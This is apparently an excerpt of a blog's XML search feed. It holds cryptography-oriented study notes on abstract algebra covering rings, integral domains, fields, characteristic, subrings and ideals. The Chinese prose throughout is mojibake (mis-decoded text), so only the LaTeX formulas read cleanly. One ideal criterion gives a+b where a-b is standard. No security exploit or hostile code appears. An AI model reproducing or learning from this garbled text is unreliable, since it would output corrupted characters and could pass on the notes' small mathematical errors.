</p><p>ä¾‹ï¼šå¤æ•°åŸŸCæ˜¯å®æ•°åŸŸRçš„ä»£æ•°é—­åŒ…</p><hr><h1 id="å®Œç»“æ’’èŠ±"><a href="#å®Œç»“æ’’èŠ±" class="headerlink" title="å®Œç»“æ’’èŠ±"></a>å®Œç»“æ’’èŠ±</h1><p>å¤ªç—›è‹¦äº†ï¼Œæˆ‘ä»æ¥æ²¡æœ‰è§‰å¾—å­¦ä¹ æŠ½è±¡ä»£æ•°å¼€å¿ƒè¿‡ã€‚</p><p>â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)/$:</em>.Â°â˜…<em> ã€‚<em>*çˆ±æ¥è‡ªğŸ˜½C.A.TğŸ˜¸å–µ</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> æœ‰é™åŸŸ </tag>
            
            <tag> æŠ½è±¡ä»£æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æŠ½è±¡ä»£æ•°Â·ç¯è®º</title>
      <link href="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/"/>
      <url>/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰</h2><hr><h1 id="ç¯è®º"><a href="#ç¯è®º" class="headerlink" title="ç¯è®º"></a>ç¯è®º</h1><p><em>ringå•Šringå•Šringï¼Œçˆ±çš„å’Œå¼¦é“ƒï¼Œyeahï¼</em></p><hr><h2 id="ç¯-ring"><a href="#ç¯-ring" class="headerlink" title="ç¯(ring)"></a>ç¯(ring)</h2><script type="math/tex; mode=display">(R,+,\cdot)\\\ RæŒ‡éç©ºé›†åˆï¼Œ+æŒ‡åŠ æ³•ï¼Œ\cdotæŒ‡ä¹˜æ³•(åŠ æ³•ä¹˜æ³•æ˜¯æŠ½è±¡æ¦‚å¿µï¼Œä¸æ˜¯ç®—æ•°åŠ æ³•å’Œä¹˜æ³•)</script><ul><li><p><strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong>ï¼š($R,+)$æ˜¯é˜¿è´å°”ç¾¤</p></li><li><p><strong>ä¹˜æ³•åŠç¾¤</strong>ï¼š$(R,\cdot)æ˜¯åŠç¾¤ï¼Œæ»¡è¶³å°é—­æ€§ã€ç»“åˆå¾‹$</p></li><li><p><strong>åˆ†é…å¾‹</strong>ï¼š$\forall a, b, c\in R$, $a\cdot ( b+ c) = a\cdot b+ a\cdot c$</p><p>$(b+c)\cdot a=b\cdot a+c \cdot a$</p></li></ul><p><strong>ç¯å¯ä»¥è¡¨ç¤ºå½¢å¦‚</strong><script type="math/tex">a_0+a_1\cdot x+\cdots+a_n\cdot x^n\\\text{å…¶ä¸­ }a_0,a_1,...a_n\in(R,+,\cdot)</script>çš„<strong>å¤šé¡¹å¼</strong></p><p><strong>æœ‰é™ç¯</strong>:ç¯çš„å…ƒç´ æ•°é‡æ˜¯æœ‰é™çš„</p><p><strong>æ— é™ç¯</strong>:ç¯çš„å…ƒç´ æ•°é‡æ˜¯æ— é™çš„</p><blockquote><p><strong>ä¾‹1</strong>ï¼š$æ•´æ•°ç¯(\mathbb{Z},+,\times):$</p><ul><li>$(\mathbb{Z},+)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$(\mathbb{Z},\times)æ»¡è¶³å°é—­æ€§ã€ç»“åˆå¾‹$</li><li>$\times å¯¹+æ»¡è¶³åˆ†é…å¾‹$</li></ul><p><strong>ä¾‹2</strong>ï¼š$\text{æœ‰ç†æ•°ç¯ }(\mathbb{Q},+,\times)\text{ã€å®æ•°ç¯ }(\mathbb{R},+,\times)$</p><p><strong>ä¾‹3</strong>ï¼š$(\mathbb{Z}_n,+,\times)$ æ˜¯ä¸ªç¯ï¼Œ$n$æ˜¯æ­£æ•´æ•°</p><ul><li>$(\mathbb{Z}_n,+)$æ˜¯é˜¿è´å°”ç¾¤</li><li>$(\mathbb{Z}_n,\times)$æ»¡è¶³å°é—­æ€§ã€ç»“åˆå¾‹</li><li>$\times$å¯¹$+$æ»¡è¶³åˆ†é…å¾‹ (æ¨¡è¿ç®—ä¸‹)</li></ul></blockquote><h3 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h3><p>ç®€ç§°$R$ä¸ºç¯ï¼Œ$\forall a,b\in R$,æœ‰</p><p>$\theta:$åŠ æ³•å•ä½å…ƒï¼Œç§°<strong>é›¶å…ƒ(zero element)</strong></p><p>$-a:a$çš„åŠ æ³•é€†å…ƒ</p><p>$a- b:$ $a+ ( - b)$</p><p>$e:$ä¹˜æ³•å•ä½å…ƒï¼Œç§°<strong>å•ä½å…ƒ</strong></p><p>$a^{-1}:a$çš„ä¹˜æ³•é€†å…ƒ</p><p>$ab:$ $a\cdot b$</p><p>$\frac ab:$ $a\cdot {b}^{- 1}$</p><h4 id="å«å¹ºäº¤æ¢ç¯-commutative-ring-with-identity"><a href="#å«å¹ºäº¤æ¢ç¯-commutative-ring-with-identity" class="headerlink" title="å«å¹ºäº¤æ¢ç¯(commutative ring with identity)"></a>å«å¹ºäº¤æ¢ç¯(commutative ring with identity)</h4><p>å³ä½¿<strong>å«å¹ºç¯</strong>åˆæ˜¯<strong>äº¤æ¢ç¯</strong>ï¼Œå³æœ‰<strong>ä¹˜æ³•å•ä½å…ƒ</strong>çš„åŒæ—¶è¿ç®—æ»¡è¶³<strong>ä¹˜æ³•äº¤æ¢å¾‹</strong></p><blockquote><p>ä¾‹:$æ•´æ•°ç¯(\mathbb{Z},+,\times):$</p><ul><li>$(\mathbb{Z},+)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$åŠç¾¤(\mathbb{Z},\times)ï¼šå•ä½å…ƒ1ã€ä¹˜æ³•äº¤æ¢å¾‹$</li><li>$\times å¯¹+æ»¡è¶³åˆ†é…å¾‹$</li></ul><p>$\mathbb{Z}æ˜¯æ— é™å«å¹ºäº¤æ¢ç¯$</p><p>$\mathbb{Z}_næ˜¯æœ‰é™å«å¹ºäº¤æ¢ç¯$</p></blockquote><ul><li>å«å¹ºç¯(ring with identity)ï¼šæœ‰ä¹˜æ³•<strong>å•ä½å…ƒ</strong>ï¼Œä¹˜æ³•éƒ¨åˆ†å˜ä¸º<strong>å¹ºåŠç¾¤</strong></li><li>äº¤æ¢ç¯(commutative ring)ï¼šæ»¡è¶³<strong>ä¹˜æ³•äº¤æ¢å¾‹</strong></li></ul><hr><h2 id="é›¶å…ƒ-zero-element"><a href="#é›¶å…ƒ-zero-element" class="headerlink" title="é›¶å…ƒ(zero element)"></a>é›¶å…ƒ(zero element)</h2><p><strong>å®šä¹‰</strong>ï¼š<script type="math/tex">*</script>æ˜¯å®šä¹‰åœ¨éç©ºé›†åˆ$A$ä¸Šçš„äºŒå…ƒè¿ç®—ï¼Œ$\theta\in A$ ,<br>å¦‚æœ$\forall a\in A$,éƒ½æœ‰<script type="math/tex">\theta*a=a*\theta=\theta,</script><br>åˆ™ç§°Î¸ä¸º<strong>é›¶å…ƒ</strong>ã€‚</p><p><strong>å°é—­æ€§</strong>ï¼šå·¦å³é›¶å…ƒç›¸ç­‰ä¸”å”¯ä¸€</p><p><strong>å®šç†1</strong>ï¼š<script type="math/tex">(A,*)</script>æ˜¯ä»£æ•°ç»“æ„ï¼Œ$|A|&gt;1$,å¦‚æœ$A$ä¸­å­˜åœ¨é›¶å…ƒ$\theta$å’Œå•ä½å…ƒ$e$,åˆ™ $\theta\neq e$ ã€‚</p><p><strong>å®šç†2</strong>ï¼šç¾¤ä¸­æ— é›¶å…ƒ</p><p><strong>å®šç†3</strong>ï¼š$R$æ˜¯ç¯ï¼Œ$\forall a\in R,\ \theta\cdot a=a\cdot \theta=\theta$</p><h3 id="é›¶å› å­-zero-divisor"><a href="#é›¶å› å­-zero-divisor" class="headerlink" title="é›¶å› å­(zero divisor)"></a>é›¶å› å­(zero divisor)</h3><p><strong>å®šä¹‰</strong>ï¼šç¯$R$ ä¸­ï¼Œéé›¶å…ƒç´  $a,b\in R\left(a\neq\theta,b\neq\theta\right.$)</p><p>æœ‰<script type="math/tex">ab=\theta,</script><br>åˆ™ç§°$a$ å’Œ$b$ ä¸ºé›¶å› å­ã€‚</p><blockquote><p>ä¾‹ï¼šç¯$\mathbb{Z}_6:2,3\in\mathbb{Z}_6,(2\times3)$ mod 6=0</p></blockquote><p>ç¯$R$ ä¸­ï¼š</p><ul><li>æœ‰é›¶å› å­ï¼š$\exists a,b\in R\left(a\neq\theta,b\neq\theta\right)$æœ‰$ab=\theta$ </li><li>æ— é›¶å› å­ï¼š$\forall a,b\in R\left(a\neq\theta,b\neq\theta\right)$,æœ‰$ab\neq\theta$</li></ul><h3 id="æ•´ç¯-intergral-domain"><a href="#æ•´ç¯-intergral-domain" class="headerlink" title="æ•´ç¯(intergral domain)"></a>æ•´ç¯(intergral domain)</h3><p><strong>å«å¹ºäº¤æ¢ç¯</strong>ï¼Œ$\theta\neq e$ ï¼Œ<strong>ä¸”æ— é›¶å› å­</strong>ï¼Œç§°ä½œ<strong>æ•´ç¯</strong>(æˆ–ä¸€ä¸ª<strong>éå¹³å‡¡</strong>çš„å«å¹ºäº¤æ¢ç¯ï¼Œæ²¡æœ‰é›¶å› å­)</p><blockquote><p>$\mathbb{Z}æ˜¯æ•´ç¯:å«å¹ºäº¤æ¢ç¯,æ— é›¶å› å­,(éé›¶æ•´æ•°ç›¸ä¹˜ä¸å¯èƒ½ç­‰äº0)$</p><p>$\mathbb{R}$ã€$\mathbb{Q}$ä¹Ÿæ˜¯æ•´ç¯</p><p>æ­£æ•´æ•°$n&gt;1$ï¼š$n$æ˜¯ç´ æ•°$\Leftrightarrow Z_n$ æ˜¯æ•´ç¯,$n$æ˜¯åˆæ•°$\Leftrightarrow Z_n$ ä¸æ˜¯æ•´ç¯,</p></blockquote><h3 id="å¹³å‡¡ç¯-trival-ring"><a href="#å¹³å‡¡ç¯-trival-ring" class="headerlink" title="å¹³å‡¡ç¯(trival ring)"></a>å¹³å‡¡ç¯(trival ring)</h3><p>$R=\{\theta\}$</p><p>$ç¯Ræœ‰(ä¹˜æ³•)å•ä½å…ƒe:$$e=0\Rightarrow å¹³å‡¡ç¯$</p><h3 id="éå¹³å‡¡ç¯-non-trival-ring"><a href="#éå¹³å‡¡ç¯-non-trival-ring" class="headerlink" title="éå¹³å‡¡ç¯(non-trival ring)"></a>éå¹³å‡¡ç¯(non-trival ring)</h3><p>$R\not=\{\theta\}$</p><p>$ç¯Ræœ‰(ä¹˜æ³•)å•ä½å…ƒe:$$e\not=0\Rightarrow éå¹³å‡¡ç¯$</p><hr><h2 id="åŸŸ-field"><a href="#åŸŸ-field" class="headerlink" title="åŸŸ(field)"></a>åŸŸ(field)</h2><h3 id="é™¤ç¯-division-ring"><a href="#é™¤ç¯-division-ring" class="headerlink" title="é™¤ç¯(division ring)"></a>é™¤ç¯(division ring)</h3><p>$(R\backslash\{\theta\},\cdot)æ˜¯ç¾¤$,ä¸è€ƒè™‘ç¯çš„é›¶å…ƒï¼Œä¹˜æ³•å¯ä»¥ä¸æ»¡è¶³äº¤æ¢å¾‹</p><h3 id="åŸŸçš„å®šä¹‰"><a href="#åŸŸçš„å®šä¹‰" class="headerlink" title="åŸŸçš„å®šä¹‰"></a>åŸŸçš„å®šä¹‰</h3><p><strong>é™¤ç¯</strong>çš„ä¹˜æ³•æ»¡è¶³<strong>ä¹˜æ³•äº¤æ¢å¾‹</strong>$\Rightarrow$<strong>éé›¶å…ƒç´ ä¸ä¹˜æ³•æ„æˆé˜¿è´å°”ç¾¤</strong>ï¼Œ$(R\backslash\{\theta\},\cdot)æ˜¯$<strong>é˜¿è´å°”ç¾¤</strong></p><p>$(F,+,\cdot)æ˜¯ä¸€ä¸ªåŸŸ,åˆ™å®ƒæ»¡è¶³ä»¥ä¸‹æ¡ä»¶:$</p><ul><li>$åŠ æ³•é˜¿è´å°”ç¾¤:(F,+)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$ä¹˜æ³•é˜¿è´å°”ç¾¤:(F\backslash\{\theta\},\cdot)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$åˆ†é…å¾‹:\forall a,b,c\in F,a\cdot(b+c)=a\cdot b+a\cdot c$</li></ul><p><strong>å®šç†1</strong>ï¼š<strong>åŸŸ</strong>ä¸€å®šæ˜¯<strong>æ•´ç¯</strong>ï¼Œ<strong>åŸŸ</strong>é‡Œæ²¡æœ‰<strong>é›¶å› å­</strong></p><p><strong>æ— é™æ•´ç¯ä¸ä¸€å®šæ˜¯åŸŸ</strong>ï¼š</p><ul><li>$\mathbb{Q}ã€\mathbb{R}$æ˜¯åŸŸ</li><li>$\mathbb{Z}$ä¸æ˜¯åŸŸï¼š$(\mathbb{Z}\backslash\{0\},\times)$ä¸æ˜¯é˜¿è´å°”ç¾¤ (ä¸æ˜¯æ‰€æœ‰å…ƒç´ éƒ½æœ‰é€†å…ƒ)</li></ul><p><strong>å®šç†2</strong>ï¼š<strong>æœ‰é™æ•´ç¯</strong>ä¸€å®šæ˜¯(æœ‰é™)<strong>åŸŸ</strong></p><p><strong>æ€§è´¨</strong>ï¼š</p><ul><li>éå¹³å‡¡ï¼šåŒ…å«è‡³å°‘2ä¸ªå…ƒç´ ($\thetaå’Œ eï¼Œe\neq 0$)</li><li>æ²¡æœ‰é›¶å› å­</li></ul><h2 id="ç‰¹å¾-characteristic"><a href="#ç‰¹å¾-characteristic" class="headerlink" title="ç‰¹å¾(characteristic)"></a>ç‰¹å¾(characteristic)</h2><p><strong>å®šä¹‰</strong>ï¼š$R$æ˜¯ç¯ï¼Œå¦‚æœå­˜åœ¨<strong>æœ€å°æ­£æ•´æ•°</strong>$m$,å¯¹äº$\forall a\in R$ ,<br>ä½¿å¾— $ma=\theta$,åˆ™ç§° $m$ æ˜¯ç¯$R$çš„<strong>ç‰¹å¾</strong>ã€‚å¦‚æœè¿™æ ·çš„$m$ä¸å­˜åœ¨ï¼Œåˆ™ç§° $R$ çš„ç‰¹å¾æ˜¯<strong>0</strong>ã€‚è®°ä¸º$Char\ R$ã€‚</p><h3 id="åŠ æ³•é˜¶"><a href="#åŠ æ³•é˜¶" class="headerlink" title="åŠ æ³•é˜¶"></a>åŠ æ³•é˜¶</h3><p>$R$æ˜¯ç¯ï¼Œ$a\in R$,å¦‚æœå­˜åœ¨æœ€å°æ­£æ•´æ•°$k$,ä½¿å¾—$ka=\theta$ ($\theta$æ˜¯ç¯$R$åŠ æ³•é˜¿è´å°”ç¾¤çš„å•ä½å…ƒ),åˆ™ç§°$k$ä¸º$a$çš„<strong>åŠ æ³•é˜¶</strong>ã€‚</p><p>å¦‚æœè¿™æ ·çš„$k$<strong>ä¸å­˜åœ¨</strong>ï¼Œåˆ™ç§°$a$æ˜¯<strong>æ— é™åŠ æ³•é˜¶</strong>çš„å…ƒç´ ã€‚</p><p><strong>å®šç†1</strong>ï¼šå¦‚æœ<strong>ç¯</strong>çš„ç‰¹å¾ä¸ç­‰äº0ï¼Œç¯é‡Œå…ƒç´ çš„<strong>åŠ æ³•é˜¶</strong>å°±éƒ½æ˜¯<strong>æœ‰é™</strong>çš„ï¼Œè€Œä¸”éƒ½æ˜¯<strong>ç‰¹å¾çš„å› å­</strong>ã€‚</p><p><strong>å®šç†2</strong>ï¼š<strong>å«å¹ºäº¤äº’ç¯</strong>çš„<strong>ç‰¹å¾</strong>ç­‰äº<strong>0æˆ–å…¶å•ä½å…ƒçš„åŠ æ³•é˜¶</strong></p><blockquote><p>ä¾‹ï¼š$Char\ \mathbb{Z}=0$ï¼Œ$Char\ \mathbb{Z}_n=n$</p></blockquote><p><strong>å®šç†3</strong>ï¼š<strong>æ•´ç¯</strong>çš„<strong>ç‰¹å¾</strong>ç­‰äº<strong>0æˆ–ç´ æ•°</strong>ï¼Œ<strong>æ•´ç¯</strong>ä¸­ï¼Œ<strong>å•ä½å…ƒ</strong>çš„<strong>åŠ æ³•é˜¶</strong>è¦ä¹ˆæ˜¯<strong>æ— é™</strong>çš„ï¼Œè¦ä¹ˆæ˜¯<strong>ç´ æ•°</strong>ã€‚</p><p><strong>å®šç†4</strong>ï¼š<strong>åŸŸ</strong>çš„<strong>ç‰¹å¾</strong>ç­‰äº<strong>0æˆ–ç´ æ•°</strong>ï¼›<strong>æœ‰é™åŸŸ</strong>çš„<strong>ç‰¹å¾</strong>æ˜¯<strong>ç´ æ•°</strong></p><hr><h2 id="å­ç¯-subring"><a href="#å­ç¯-subring" class="headerlink" title="å­ç¯(subring)"></a>å­ç¯(subring)</h2><p><strong>å®šä¹‰</strong>ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$S$ æ˜¯ $R$ çš„éç©ºå­é›†ï¼Œå¦‚æœ$(S,+,\cdot)$ ä¹Ÿæ˜¯ç¯ï¼Œç§°$(S,+,\cdot)$æ˜¯$(R,+,\cdot)$çš„å­ç¯ã€‚ç®€ç§°$S$ æ˜¯$R$ çš„å­ç¯ï¼Œ$R$ æ˜¯$S$ çš„<strong>æ‰©ç¯(extension ring)</strong>ã€‚</p><blockquote><p>ä¾‹ï¼š</p><ul><li>$Qæ˜¯Rçš„å­ç¯,Ræ˜¯Qçš„æ‰©ç¯ã€‚$</li><li>$Zæ˜¯Qå’ŒRçš„å­ç¯,Qå’ŒRæ˜¯Zçš„æ‰©ç¯$ã€‚</li><li>$Z_nä¸æ˜¯Zçš„å­ç¯:äºŒè€…å…ƒç´ å’Œè¿ç®—ä¸åŒ(Z_nä¸­çš„å…ƒç´ æ˜¯å‰©ä½™ç±»è€Œéæ•´æ•°)$</li><li>$mZæ˜¯Zçš„å­ç¯(mæ˜¯æ•´æ•°)$</li></ul></blockquote><p>å®šä¹‰åˆ¤æ–­<strong>å­ç¯</strong>ï¼šéç©ºå­é›†$S\subseteq R$ ($\forall a,b\in S)$</p><ul><li><p><strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong></p><p>å°é—­æ€§ï¼š$a+b\in S$</p><p><del>ç»“åˆå¾‹ï¼š$a+(b+c)=(a+b)+c$</del></p><p><del>å•ä½å…ƒï¼š$\theta\in S$</del></p><p><del>é€†å…ƒï¼š$-a\in S$</del></p></li><li><p><strong>ä¹˜æ³•åŠç¾¤</strong></p><p>å°é—­æ€§ï¼š$ab\in S$</p><p><del>ç»“åˆå¾‹ï¼š$a(bc)=(ab)c$</del></p></li></ul><p><strong>å‘½é¢˜1</strong>ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$S $æ˜¯$R$çš„<strong>éç©ºå­é›†</strong>ï¼Œ$S$æ˜¯$R$çš„å­ç¯ï¼Œå½“ä¸”ä»…å½“ï¼Œ$\forall a,b\in S$,$S$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li><strong>åŠ æ³•å°é—­æ€§</strong>ï¼š$a-b\in S$æˆ–æ»¡è¶³<strong>åŠ æ³•å­ç¾¤</strong>ï¼š$(R,+)$çš„å­ç¾¤</li><li><strong>ä¹˜æ³•å°é—­æ€§</strong>ï¼š$ab\in S$</li></ul><p><strong>æ³¨æ„</strong>ï¼š</p><p><strong>å«å¹ºäº¤æ¢ç¯çš„å­ç¯æœªå¿…æ˜¯å«å¹ºäº¤æ¢ç¯</strong></p><blockquote><p>ä¾‹ï¼šZæ˜¯å«å¹ºäº¤æ¢ç¯ï¼Œå®ƒçš„å­ç¯é‡Œï¼Œåªæœ‰å®ƒæœ¬èº«æ˜¯å«å¹ºäº¤æ¢ç¯ï¼Œå…¶ä»–çš„éƒ½ä¸æ˜¯å«å¹ºäº¤æ¢ç¯ã€‚</p></blockquote><p><strong>æ•´ç¯çš„å­ç¯æœªå¿…æ˜¯æ•´ç¯</strong></p><p><strong>åŸŸçš„å­ç¯æœªå¿…æ˜¯åŸŸ</strong></p><h3 id="ç†æƒ³-ideal"><a href="#ç†æƒ³-ideal" class="headerlink" title="ç†æƒ³(ideal)"></a>ç†æƒ³(ideal)</h3><p><strong>å…¨ç§°</strong>ï¼šç†æƒ³å­ç¯</p><p><strong>å®šä¹‰</strong>ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$I$ æ˜¯ $R$çš„éç©ºå­é›†ã€‚å¦‚æœ$(I,+,\cdot) $æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>åŠ æ³•å­ç¾¤ï¼š($I$,+)æ˜¯$(R,+)$çš„å­ç¾¤ï¼Œ</li><li>(ä¹˜æ³•)<strong>å¸æ”¶</strong>å¾‹ï¼š$\forall r\in R,\forall a\in I\Rightarrow ra\in I$ $(ar\in I)$,</li></ul><p>åˆ™ç§°$I$æ˜¯$R$çš„<strong>å·¦(å³)ç†æƒ³</strong>ã€‚</p><p><strong>å‘½é¢˜</strong>ï¼š$(R,+,\cdot)$æ˜¯äº¤æ¢ç¯ï¼Œ$I $æ˜¯$R$çš„ç†æƒ³ï¼Œ$\forall a,b\in I $,$\forall r\in R$,å½“ä¸”ä»…å½“ï¼Œ$I$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>åŠ æ³•å°é—­æ€§ï¼š$a+b\in I$</li><li>(ä¹˜æ³•)å¸æ”¶å¾‹ï¼š$ra\in I$</li></ul><p><strong>å®šç†</strong>1ï¼šä»»ä½•ç†æƒ³éƒ½æ˜¯å­ç¯</p><p><strong>æ³¨æ„</strong>ï¼šç†æƒ³/å­ç¯ä¸€å®šåŒ…å«ç¯çš„é›¶å…ƒï¼Œä½†æœªå¿…åŒ…å«ç¯çš„å•ä½å…ƒ</p><p><strong>å®šç†</strong>2ï¼š$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„ç†æƒ³ï¼Œ$e\in R$,åˆ™<script type="math/tex">e\in I\Leftrightarrow I=R</script></p><p><strong>æ³¨æ„</strong>ï¼šç¯ã€å­ç¯çš„å•ä½å…ƒå¹¶æ— å…³ç³»</p><h4 id="ä¸€äº›æ¦‚å¿µ-1"><a href="#ä¸€äº›æ¦‚å¿µ-1" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h4><p>è®¾$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„ç†æƒ³ï¼š</p><ul><li><strong>é›¶ç†æƒ³</strong>(zero ideal): $\{\theta\}$ (å…¶ä»–çš„ç§°ä¸º<strong>éé›¶ç†æƒ³</strong>)</li><li><strong>å•ä½ç†æƒ³</strong>(unit ideal): $R$è‡ªèº«</li><li><strong>å¹³å‡¡ç†æƒ³</strong>(trivial ideal): $\{\theta\}$å’Œ$R$ï¼Œ(å…¶ä»–çš„ç§°ä¸º<strong>éå¹³å‡¡ç†æƒ³</strong>)</li><li><strong>çœŸç†æƒ³</strong>(proper ideal): $I\subset R$</li></ul><h4 id="ä¸»ç†æƒ³-principal"><a href="#ä¸»ç†æƒ³-principal" class="headerlink" title="ä¸»ç†æƒ³(principal)"></a>ä¸»ç†æƒ³(principal)</h4><p><strong>å®šä¹‰</strong>ï¼š$R$æ˜¯ç¯ï¼Œ$a\in R$,ç§°$aR (Ra)$ä¸ºç”±$a$ç”Ÿæˆçš„$R$çš„å·¦(å³)ä¸»ç†æƒ³</p><script type="math/tex; mode=display">(aR=\{ar\mid r\in R\},\quad Ra=\{ra|r\in R\})</script><ul><li>$R$æ˜¯<strong>äº¤æ¢ç¯</strong>ï¼Œ$a\in R$,åˆ™$aR=Ra$ï¼Œç§°ä¹‹ä¸ºç”±äº$a$ç”Ÿæˆçš„$R$çš„ä¸»ç†æƒ³ï¼Œè®°ä¸º$(a)$</li><li>${\theta}=(\theta)$</li><li>$R=eR=Re=(e)\ (å«å¹ºäº¤æ¢ç¯)$</li></ul><p><strong>å®šç†1</strong>ï¼š$R$æ˜¯äº¤æ¢ç¯ï¼Œ$a\in R,(a)$æ˜¯$R$çš„ç†æƒ³</p><p><strong>æ€§è´¨</strong>ï¼šç¯çš„ç†æƒ³åŒ…å«å…ƒç´ aï¼Œä¸€å®šåŒ…å«ç”±aç”Ÿæˆçš„ä¸»ç†æƒ³</p><blockquote><p>ä¾‹ï¼š$mZ$æ˜¯$Z$çš„ä¸»ç†æƒ³(mæ˜¯æ•´æ•°)</p><ul><li>$m\in Z,mZç¬¦åˆä¸»ç†æƒ³çš„æ„é€ æ–¹æ³•$</li></ul></blockquote><p>$Z$çš„æ‰€æœ‰ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³ï¼š$(m):=mZ(mæ˜¯æ•´æ•°)$</p><h4 id="ç´ ç†æƒ³-prime-ideal"><a href="#ç´ ç†æƒ³-prime-ideal" class="headerlink" title="ç´ ç†æƒ³(prime ideal)"></a>ç´ ç†æƒ³(prime ideal)</h4><p><strong>å®šä¹‰</strong>ï¼š$I$ æ˜¯ç¯$R$ çš„çœŸç†æƒ³ã€‚$\forall\boldsymbol{a},\boldsymbol{b}\in R$,å¦‚æœ$ab\in I$,æœ‰$a\in I$ æˆ– $b\in I$ ,ç§°$I$æ˜¯$R$çš„ç´ ç†æƒ³</p><p>$p|ab$,åˆ™$p|a$æˆ–$p|b$</p><blockquote><p>ä¾‹1ï¼š<strong>$m$æ˜¯ç´ æ•°æ—¶ï¼Œ$mZ$æ˜¯ç´ ç†æƒ³</strong>ï¼š$a,b\in Z,ab\in3Z$<br>åˆ™ 3$|ab$,æœ‰3$|a$æˆ–3$|b$,å³$a\in3Z$æˆ–$b\in3Z$</p><p>ä¾‹2ï¼šé›¶ç†æƒ³$\{0\}=0\mathbb{Z}$ æ˜¯$Z$çš„ç´ ç†æƒ³ï¼š$\boldsymbol a,b\in Z$ , $ab=0\in\{0\}$,åˆ™$a=0\in\{0\}$ æˆ– $b=0\in\{0\}$</p><p>ä¾‹3ï¼š$m$æ˜¯åˆæ•°æ—¶ï¼Œ$mZ$ä¸æ˜¯ç´ ç†æƒ³ï¼š$a=2$å’Œ$b=3$,$ab\in6Z$,ä½†$a\in2Z,b\in3Z$</p><p>ç»“è®ºï¼š<strong>å½“ä¸”ä»…å½“ï¼Œ$m$æ˜¯ç´ æ•°æˆ–0æ—¶ï¼Œ$mZ$</strong>æ˜¯$Z$çš„ç´ ç†æƒ³</p></blockquote><p><strong>æ³¨æ„</strong>ï¼šè®¨è®ºç´ ç†æƒ³æ—¶ï¼Œä¸è€ƒè™‘å•ä½ç†æƒ³ï¼Œå› ä¸ºå®ƒä¸æ˜¯çœŸç†æƒ³</p><h4 id="æå¤§ç†æƒ³-maximal-ideal"><a href="#æå¤§ç†æƒ³-maximal-ideal" class="headerlink" title="æå¤§ç†æƒ³(maximal ideal)"></a>æå¤§ç†æƒ³(maximal ideal)</h4><p><strong>å®šä¹‰</strong>ï¼š$M$ æ˜¯ç¯R çš„<strong>çœŸç†æƒ³</strong>ã€‚é™¤$R$ä»¥å¤–ï¼Œ<strong>ä¸å­˜åœ¨</strong>ä»»ä½•åŒ…å«$M$çš„ç†æƒ³ï¼Œåˆ™ç§°$M$ æ˜¯$R$ çš„<strong>æå¤§ç†æƒ³</strong></p><p><strong>ç­‰ä»·å®šä¹‰</strong>ï¼š$M$ æ˜¯ç¯R çš„<strong>çœŸç†æƒ³</strong>ã€‚å¯¹äºä»»æ„åŒ…å«$M$çš„ç†æƒ³$I$,éƒ½æœ‰$I=M$æˆ–$I=R$ ,åˆ™ç§°$M$æ˜¯$R$çš„<strong>æå¤§ç†æƒ³</strong></p><blockquote><p>ä¾‹ï¼š<strong>$m$æ˜¯ç´ æ•°æ—¶ï¼Œ$mZ$æ˜¯$Z$çš„æå¤§ç†æƒ³</strong></p><p>ä¾‹ï¼šé›¶ç†æƒ³{0}ä¸æ˜¯$Z$çš„æå¤§ç†æƒ³ï¼Œå› ä¸º$Z$çš„ä»»ä½•(éå¹³å‡¡)ç†æƒ³éƒ½åŒ…å«{0}</p></blockquote><h4 id="å°ç»“ï¼š-mathbb-Z-çš„3ç§ç†æƒ³"><a href="#å°ç»“ï¼š-mathbb-Z-çš„3ç§ç†æƒ³" class="headerlink" title="å°ç»“ï¼š$\mathbb{Z}$çš„3ç§ç†æƒ³"></a>å°ç»“ï¼š$\mathbb{Z}$çš„3ç§ç†æƒ³</h4><p>è®¾$m$æ˜¯ä»»æ„æ•´æ•° $((m):=m\mathbb{Z})$</p><ul><li>$(m):$ä¸»ç†æƒ³</li><li>$(m)$:ç´ ç†æƒ³ã€æå¤§ç†æƒ³($m$ä¸ºç´ 